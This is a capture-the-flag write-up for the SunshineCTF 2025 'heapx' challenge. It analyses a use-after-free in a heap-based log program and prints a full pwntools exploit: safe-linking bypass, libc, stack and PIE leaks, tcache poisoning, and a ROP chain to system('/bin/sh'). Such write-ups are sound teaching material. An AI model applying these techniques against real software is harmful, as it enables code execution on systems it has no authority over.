---
title: SunshineCTF - heapx Challenge Writeup
summary: A detailed writeup for the heapx challenge from SunshineCTF 2025, focusing on heap exploitation techniques.
description: This writeup explains how to solve the heapx challenge by leveraging a UAF bug.
tags: [ctf, writeup, pwn, heap]
categories: [heap, Use After Free]
date: 2025-09-29
draft: false
---

# SunshineCTF 2025 - HeapX Challenge: Complete Technical Analysis and Exploitation Guide

## 📋 Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Binary Analysis & Reverse Engineering](#binary-analysis--reverse-engineering)
3. [Vulnerability Assessment](#vulnerability-assessment)
4. [Heap Exploitation Fundamentals](#heap-exploitation-fundamentals)
5. [Step-by-Step Exploitation](#step-by-step-exploitation)
6. [Advanced Concepts Explained](#advanced-concepts-explained)
7. [Code Analysis](#code-analysis)
8. [Conclusion & Key Takeaways](#conclusion--key-takeaways)

---

## 🎯 Challenge Overview

### Challenge Information

- **Name:** HeapX
- **Category:** PWN (Binary Exploitation)
- **Difficulty:** Medium-Hard
- **Author:** Oreomeister
- **CTF:** SunshineCTF 2025

### Challenge Description

> HeapX  
> Oreomeister  
> We discovered the Falcon 9 rocket's log aggregator, HeapX, can you pwn it and take control before it reaches orbit?

### Files Provided

- `heapx` - Main binary executable
- `libc.so.6` - Custom libc library (version 2.35)
- `ld-linux-x86-64.so.2` - Dynamic linker
- Additional files: IDA database files (`.id0`, `.id1`, `.id2`, `.nam`, `.til`)

---

## 🔍 Binary Analysis & Reverse Engineering

### Security Mitigations Analysis

```bash
$ checksec heapx
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

#### Security Features Breakdown:

1. **Full RELRO (RELocation Read-Only)**

   - Global Offset Table (GOT) is read-only after initialization
   - Prevents GOT overwrite attacks
   - Makes traditional ret2libc harder

2. **Stack Canary**

   - Stack buffer overflow protection
   - Random canary value placed before return address
   - Detects stack corruption

3. **NX (No eXecute)**

   - Stack and heap are non-executable
   - Prevents shellcode injection
   - Forces use of ROP/JOP techniques

4. **PIE (Position Independent Executable)**

   - Base address randomized at runtime
   - Requires address leaks for reliable exploitation
   - Combined with ASLR makes exploitation harder

5. **RUNPATH Setting**
   - Forces loading of provided libc instead of system libc
   - Ensures consistent exploitation environment

### Binary Patching Process

The challenge requires patching the binary to use the provided libc:

```bash
# Using pwninit for automatic patching
$ pwninit --bin heapx --libc libc.so.6 --ld ld-linux-x86-64.so.2
```

This creates `heapx_patched` with correct library dependencies.

### Program Structure Analysis

The binary implements a menu-driven heap management system with five main functions:

```
1. Allocate - Create new log entry
2. Read     - Display log content
3. Write    - Modify log content
4. Delete   - Remove log entry
5. Exit     - Terminate program
```

### Data Structures

The program maintains two global arrays:

```c
void* ptr_table[16];    // Stores pointers to allocated chunks
int size_table[16];     // Stores sizes of allocated chunks
```

---

## 🔧 Binary Analysis & Reverse Engineering

### Function 1: Allocate (`create`)

```c
__int64 __fastcall create(int index, int size)
{
    void *ptr;

    if (size > 0 && size <= 1279) {
        ptr = malloc(size);
        if (ptr) {
            puts("[INFO] Creating new log...");
            ptr_table[index] = ptr;           // Store pointer
            size_table[index] = size;         // Store size
            return 1LL;
        }
        else {
            return 0LL;
        }
    }
    else {
        puts("[ERROR] Invalid size!!");
        return 0LL;
    }
}
```

**Key Points:**

- Size validation: 1 ≤ size ≤ 1279
- Uses standard `malloc()` for allocation
- Stores both pointer and size in global arrays
- No bounds checking on `index` parameter

### Function 2: Read (`read_data`)

```c
unsigned __int64 __fastcall read_data(int index)
{
    unsigned __int64 v2;

    v2 = __readfsqword(0x28u);  // Stack canary
    if (index < 0x10) {
        if (ptr_table[index]) {
            printf("%s", ptr_table[index]);  // Print chunk content
        }
        else {
            printf("[ERROR] Log #%d doesn't exist!!\n", index);
        }
    }
    else {
        puts("[ERROR] Invalid log number!!");
    }
    return v2 - __readfsqword(0x28u);
}
```

**Key Points:**

- Index validation: 0 ≤ index < 16
- Uses `printf("%s", ptr)` - treats chunk as string
- No null pointer check after free (UAF vulnerability)
- Stack canary protection enabled

### Function 3: Write (`write`)

```c
unsigned __int64 __fastcall write(unsigned int index, int offset)
{
    int v3;
    _BYTE buf[1288];
    unsigned __int64 v5;

    v5 = __readfsqword(0x28u);  // Stack canary
    memset(buf, 0, 0x500uLL);

    if (index < 0x10) {
        if (ptr_table[index]) {
            if (offset >= 0 && offset < size_table[index]) {
                printf("Enter log data: ");
                v3 = read(0, buf, size_table[index] - 1 - offset);
                memcpy((offset + ptr_table[index]), buf, v3 - 1);
            }
            else {
                puts("[ERROR] Write offset is invalid!!");
            }
        }
        else {
            printf("[ERROR] Log #%p doesn't exist!!\n", &ptr_table + 16 * index);
        }
    }
    else {
        puts("[ERROR] Invalid log number!!");
    }
    return v5 - __readfsqword(0x28u);
}
```

**Key Points:**

- Allows writing at specific offset within chunk
- Buffer size: 1288 bytes (0x500)
- Bounds checking on offset
- **Information Leak**: Error message reveals ptr_table address
- Copies `v3 - 1` bytes (one less than read)

### Function 4: Delete (`delete`)

```c
unsigned __int64 __fastcall delete(int index)
{
    unsigned __int64 v2;

    v2 = __readfsqword(0x28u);  // Stack canary
    if (index < 0x10) {
        if (ptr_table[index]) {
            free(ptr_table[index]);
            // BUG: Does not set ptr_table[index] = NULL
        }
        else {
            printf("[ERROR] Log #%d doesn't exist!!\n", index);
        }
    }
    else {
        puts("[ERROR] Invalid log number!!");
    }
    return v2 - __readfsqword(0x28u);
}
```

**CRITICAL VULNERABILITY:**

- Calls `free()` but doesn't nullify pointer
- Creates Use-After-Free (UAF) condition
- Allows access to freed memory through read/write functions

### Program Exit Handler

```c
puts("\n[INFO] Shutting down HeapX LogUplink...");
for (i = 0; i <= 15; ++i) {
    if (ptr_table[i]) {
        free(ptr_table[i]);  // Double-free if already freed
    }
}
return 0LL;
```

**Important Notes:**

- Loops through all entries and frees them
- Can cause double-free if chunks were already freed
- This behavior is exploitable

---

## 🚨 Vulnerability Assessment

### Primary Vulnerability: Use-After-Free (UAF)

**Root Cause:**
The `delete` function calls `free()` but fails to set the corresponding pointer to NULL.

```c
// Vulnerable code in delete function
free(ptr_table[index]);
// Missing: ptr_table[index] = NULL;
```

**Impact:**

1. **Memory Corruption**: Access to freed memory chunks
2. **Information Disclosure**: Can read freed chunk contents
3. **Arbitrary Write**: Can modify freed chunk data
4. **Control Flow Hijack**: Potential RCE through heap exploitation

### Secondary Vulnerabilities

1. **Information Leak in Write Function**

   ```c
   printf("[ERROR] Log #%p doesn't exist!!\n", &ptr_table + 16 * index);
   ```

   Reveals ptr_table address, defeating PIE

2. **Double-Free in Exit Handler**

   - Can trigger double-free conditions
   - Potentially exploitable for heap corruption

3. **Missing Input Validation**
   - No comprehensive bounds checking
   - Potential integer overflow scenarios

---

## 🧠 Heap Exploitation Fundamentals

### Modern Heap Security Features

#### 1. Safe Linking (glibc ≥ 2.32)

Safe Linking protects forward pointers in freed chunks by XORing them with a key derived from their address.

**Formula:**

```
protected_ptr = real_ptr ^ (chunk_addr >> 12)
```

**Purpose:**

- Prevents arbitrary chunk allocation
- Makes heap exploitation significantly harder
- Protects against simple tcache/fastbin attacks

**Bypass Strategy:**

1. Leak heap address to calculate key
2. XOR leaked pointer with key to get real address
3. XOR target address with key to create valid pointer

#### 2. Tcache (Thread Local Cache)

**Characteristics:**

- Per-thread cache for small allocations (≤ 1024 bytes)
- LIFO (Last In, First Out) structure
- Up to 7 chunks per size class
- Minimal security checks compared to other bins

**Exploitation Advantages:**

- Easier to manipulate than fastbins
- Fewer consistency checks
- Direct pointer reuse

#### 3. Heap Layout Understanding

**Typical Layout:**

```
[Heap Base]
├── Tcache chunks (small sizes)
├── Fast chunks (if tcache full)
├── Small chunks
├── Large chunks
├── Unsorted bin
└── [Top Chunk]
```

---

## 🎯 Step-by-Step Exploitation

### Exploitation Strategy Overview

Our multi-stage exploitation approach:

1. **Heap Address Leak** - Bypass Safe Linking
2. **Libc Address Leak** - Defeat ASLR
3. **Stack Address Leak** - Locate return address
4. **PIE Base Leak** - Calculate code addresses
5. **Memory Manipulation** - Control program flow
6. **ROP Chain Execution** - Achieve code execution

### Stage 1: Heap Address Leak

**Objective:** Obtain heap base address to bypass Safe Linking

```python
# Allocation pattern for heap leak
chunk_A = malloc(0x80)  # First chunk
chunk_B = malloc(0x80)  # Second chunk
chunk_C = malloc(0x420) # Large chunk (for libc leak later)
chunk_D = malloc(0x80)  # Fourth chunk

# Create tcache chain: chunk_B -> chunk_A
delete(chunk_A)
delete(chunk_B)
delete(chunk_C)  # Goes to unsorted bin

# Read protected pointer from chunk_B
read(chunk_B)
leak = p.recvn(6)
leak = u64(leak.ljust(8, b'\x00'))

# Read key from chunk_A
read(chunk_A)
p.recvn(0x1)  # Skip first byte
leak2 = p.recvn(6)
key = u64(leak2[1:].ljust(8, b'\x00'))

# Recover real address
addr = leak ^ key
heap_base = addr - 0x12b0
```

**Technical Details:**

1. **Tcache Behavior**: When chunks are freed, they form a singly-linked list
2. **Safe Linking**: Forward pointers are XORed with `(chunk_addr >> 12)`
3. **Key Extraction**: The key can be extracted from the obfuscated pointer of another chunk
4. **Address Recovery**: XOR the leaked value with the key to get the real address

**Memory Layout After Frees:**

```
chunk_B: [protected_ptr_to_A | ...]
chunk_A: [protected_null | ...]
```

### Stage 2: Libc Address Leak

**Objective:** Defeat ASLR by leaking libc base address

```python
# chunk_C was freed earlier and went to unsorted bin
read(chunk_C)
leak3 = p.recvn(8)
leak3 = u64(leak3[2:].ljust(8, b'\x00'))

# Calculate libc base from main_arena
libc.address = leak3 - 0x210b20
```

**Technical Details:**

1. **Unsorted Bin**: Large chunks (≥ 1024 bytes) go here when freed
2. **Main Arena**: Unsorted bin chunks have fd/bk pointers to main_arena
3. **Fixed Offset**: main_arena has a known offset from libc base
4. **Address Calculation**: libc_base = leaked_address - known_offset

**Memory Layout of Freed Large Chunk:**

```
chunk_C: [prev_size | size | fd_ptr_to_main_arena | bk_ptr_to_main_arena | ...]
```

### Stage 3: Stack Address Leak

**Objective:** Locate stack to find return address

```python
# Use environ pointer to leak stack address
environ = libc.symbols['environ']

# Exploit UAF to redirect tcache allocation
delete(chunk_D)
payload = p64((environ-24) ^ ((heap_base + 0x1000) >> 12))
write(chunk_D, b'0', payload)

# Allocate chunks to get environ chunk
chunk_F = malloc(0x80)
chunk_G = malloc(0x80)  # Points to environ-24

# Overwrite and read stack pointer
payload = b'D3L3T357' * 3
write(chunk_G, b'0', payload)
read(chunk_G)
p.recvn(0x19)
leak_stack = p.recvn(8)[2:]
leak_stack = u64(leak_stack.ljust(8, b'\x00'))

rbp_addr = leak_stack - 0x138
```

**Technical Details:**

1. **Environ Variable**: Global pointer to environment variables on stack
2. **Tcache Poisoning**: Overwrite fd pointer to redirect allocation
3. **Safe Linking Bypass**: Use heap base to calculate proper XOR key
4. **Stack Layout**: environ points to stack, calculate return address offset

**Tcache Manipulation:**

```
Original: chunk_D -> chunk_X
Modified: chunk_D -> (environ ^ key)
Result:   malloc() returns environ address
```

### Stage 4: PIE Base Address Leak

**Objective:** Calculate code base address to locate ptr_table

```python
# Exploit information leak in write function
p.sendline(b'write 15')  # Invalid index
p.sendline(b'0')
p.recvuntil(b'0x')
leak_elf = p.recv(12)
leak_elf = int(leak_elf, 16)

# Calculate PIE base
elf.address = leak_elf - 0x4150
```

**Technical Details:**

1. **Information Leak**: Write function leaks ptr_table address in error message
2. **PIE Calculation**: ptr_table has fixed offset from binary base
3. **Address Validation**: Verify leak by checking known binary structure

### Stage 5: ROP Chain Construction

**Objective:** Build ROP chain for shell execution

```python
# Allocate chunks for stack manipulation
chunk_H = malloc(0x30)
chunk_I = malloc(0x30)

# Create tcache chain for stack write
delete(chunk_H)
delete(chunk_I)

# Redirect to stack location
payload = p64((rbp_addr) ^ ((heap_base + 0x1000) >> 12))
write(chunk_I, b'0', payload)

chunk_J = malloc(0x30)
chunk_K = malloc(0x30)  # Points to stack

# Build ROP chain
bin_sh = libc.address + 0x1d84ab
pop_rdi = libc.address + 0x119e9c
system = libc.address + 0x5c110
ret = libc.address + 0x0000000000028882

rop_chain = p64(0) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
write(chunk_K, b'0', rop_chain)
```

**ROP Chain Analysis:**

```assembly
pop rdi; ret    # Load /bin/sh address into rdi
<address of /bin/sh>
ret             # Stack alignment for system call
system          # Execute system("/bin/sh")
```

### Stage 6: Memory Cleanup

**Objective:** Clear ptr_table to avoid double-free crashes

```python
# Allocate large chunks for ptr_table access
chunk_L = malloc(0x200)
chunk_M = malloc(0x200)
chunk_N = malloc(0x100)  # Guard chunk

# Create tcache chain
delete(chunk_L)
delete(chunk_M)

# Redirect to ptr_table
ptr_table = elf.address + 0x4060
payload = p64((ptr_table) ^ ((heap_base + 0x1000) >> 12))
write(chunk_M, b'0', payload)

# Allocate to get ptr_table access
chunk_N = malloc(0x200)
chunk_O = malloc(0x200)  # Points to ptr_table

# Clear ptr_table to avoid double-free in exit handler
payload = p64(0) * 32  # Clear all 16 entries (8 bytes each)
write(chunk_O, b'0', payload)
```

**Technical Details:**

1. **Guard Chunk**: Prevents consolidation with top chunk
2. **Large Size**: 0x200 bytes needed to clear entire ptr_table
3. **Double-Free Prevention**: Nullified pointers prevent exit handler crashes
4. **Clean Exit**: Program exits normally, executing our ROP chain

---

## 🎓 Advanced Concepts Explained

### Safe Linking Deep Dive

**Implementation Details:**

```c
// In glibc source (malloc.c)
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))

#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

**Mathematical Explanation:**

- Key = `chunk_address >> 12` (right shift by 12 bits)
- Protected = `real_pointer ^ key`
- Recovery = `protected_pointer ^ key`

**Why Shift by 12?**

- Page boundary alignment (4KB pages)
- Reduces key space while maintaining security
- Balances performance vs security

### Tcache vs Fastbin Differences

| Feature                | Tcache       | Fastbin        |
| ---------------------- | ------------ | -------------- |
| Size Limit             | ≤ 1024 bytes | ≤ 128 bytes    |
| Per-thread             | Yes          | No             |
| Security Checks        | Minimal      | More extensive |
| Double-free Protection | Basic        | Advanced       |
| Safe Linking           | Yes          | Yes            |

### ASLR and PIE Interaction

**ASLR (Address Space Layout Randomization):**

- Randomizes memory layout at process startup
- Affects stack, heap, libraries, and executable (if PIE)

**PIE (Position Independent Executable):**

- Makes executable code relocatable
- Combined with ASLR, randomizes code location
- Requires code address leaks for exploitation

**Bypass Strategies:**

1. Information leaks (format string, buffer over-read)
2. Partial overwrite attacks (when randomization is limited)
3. Brute force (for limited entropy scenarios)

### ROP Chain Design Principles

**Stack Alignment:**

- x64 ABI requires 16-byte stack alignment before function calls
- Add `ret` gadget for alignment if needed

**Gadget Selection:**

- Prefer gadgets from libc (larger gadget space)
- Avoid gadgets with side effects
- Chain gadgets for complex operations

**Payload Structure:**

```
[padding] [gadget1] [arg1] [gadget2] [arg2] ... [final_function]
```

---

## 💻 Code Analysis

### Complete Exploit Script Analysis

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./heapx_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

gs = '''
init-pwndbg'''
context.binary = elf

global counter
counter = -1
def malloc(size):
    global counter
    counter+=1
    p.sendline(f'new {size}'.encode())
    p.recv()
    return counter

def read(index):
    p.sendline(f'read {index}'.encode())

def write(index,offset, data):
    p.sendline(f'write {index}'.encode())
    p.sendline(offset)
    p.sendlineafter(b'data:',data)

def delete(index):
    p.sendline(f'delete {index}'.encode())
    p.recv()

p = process()

chunk_A = malloc(0x80)
chunk_B = malloc(0x80)
chunk_C = malloc(0x420)
chunk_D = malloc(0x80)

delete(chunk_A)
delete(chunk_B)
delete(chunk_C)

read(chunk_B)
leak = p.recvn(6)
leak = u64(leak.ljust(8,b'\x00'))
log.critical(f"leak: {hex(leak)}")

read(chunk_A)
p.recvn(0x1)
leak2 = p.recvn(6)
key = u64(leak2[1:].ljust(8,b'\x00'))
log.critical(f"key: {hex(key)}")

# =+=+--+=+= LEAKING HEAP AND LIBC BASE +=+=+--+=+=
addr = leak^ key
log.info(f"addr: {hex(addr)}")

heap_base = addr - 0x12b0
log.critical(f"heap base: {hex(heap_base)}")

read(chunk_C)
leak3 = p.recvn(8)
leak3 = u64(leak3[2:].ljust(8,b'\x00'))
log.info(f"leak3: {hex(leak3)}")

libc.address = leak3 - 0x210b20
log.critical(f"libc base: {hex(libc.address)}")

# =+=+--+=+= LEAKING STACK ADDRESS +=+=+--+=+=

chunk_E = malloc(0x420)

environ = libc.symbols['environ']
log.critical(f"environ: {hex(environ)}")

delete(chunk_D)
payload = p64((environ-24) ^ ((heap_base + 0x1000) >> 12))
write(chunk_D,b'0',payload)

chunk_F = malloc(0x80)
chunk_G = malloc(0x80) # <--- our environ chunk
payload = b'D3L3T357'*3
write(chunk_G,b'0',payload)
read(chunk_G)
p.recvn(0x19)
leak_stack = p.recvn(8)[2:]
leak_stack = u64(leak_stack.ljust(8,b'\x00'))
log.success(f"leak stack: {hex(leak_stack)}")

rbp_addr = leak_stack - 0x138
log.critical(f"rbp addr: {hex(rbp_addr)}")

# =+=+--+=+= ELF LEAK +=+=+--+=+=
p.sendline(b'write 15')
p.sendline(b'0')
p.recvuntil(b'0x')
leak_elf = p.recv(12)
leak_elf = int(leak_elf,16)
log.success(f"leak elf: {hex(leak_elf)}")
elf.address = leak_elf - 0x4150
log.critical(f"elf base: {hex(elf.address)}")

# =+=+--+=+= ROP CHAIN ON STACK +=+=+--+=+=

chunk_H = malloc(0x30)
chunk_I = malloc(0x30)

delete(chunk_H)
delete(chunk_I)

payload = p64((rbp_addr) ^ ((heap_base + 0x1000) >> 12))
write(chunk_I,b'0',payload)
chunk_J = malloc(0x30)
chunk_K = malloc(0x30) # <--- our stack chunk

bin_sh = libc.address+0x1d84ab
pop_rdi = libc.address+0x119e9c
system = libc.address+0x5c110
pop_rdi_pop_rbp = libc.address+0x2aa6b
ret = libc.address+0x0000000000028882

payload = p64(0) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
write(chunk_K,b'0',payload)


# =+=+--+=+= CLEARING PTR_TABLE AND SIZE_TABLE +=+=+--+=+=

chunk_L = malloc(0x200)
chunk_M = malloc(0x200)

chunk_N = malloc(0x100) # guard chunk
delete(chunk_L)
delete(chunk_M)

ptr_table = elf.address + 0x4060
payload = p64((ptr_table) ^ ((heap_base + 0x1000) >> 12))

write(chunk_M,b'0',payload)
chunk_N = malloc(0x200)
chunk_O = malloc(0x200) # <--- our ptr_table chunk
payload = p64(0)*32
write(chunk_O,b'0',payload)

gdb.attach(p,gs)
p.interactive()

```

### Key Implementation Details

1. **Error Handling**: Robust interaction with process
2. **Address Calculation**: Precise offset calculations
3. **Safe Linking Bypass**: Proper XOR key computation
4. **Memory Management**: Clean allocation/deallocation
5. **ROP Construction**: Stack-aligned chain building

---
